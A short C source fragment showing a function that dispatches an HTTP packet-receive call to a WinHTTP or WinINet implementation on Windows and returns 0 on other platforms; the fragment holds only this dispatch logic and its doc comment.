 * @return An indication of the result of processing the transmission request.
 * @remark This function is just a proxy which calls \c packet_receive_http_via_wininet
 *         and doesn't yet have a POSIX implementation.
 */
DWORD packet_receive_via_http( Remote *remote, Packet **packet )
{
#ifdef _WIN32
#ifdef USE_WINHTTP
	return packet_receive_http_via_winhttp(remote, packet);
#else
	return packet_receive_http_via_wininet(remote, packet);
#endif
#else
	return 0;
#endif
}
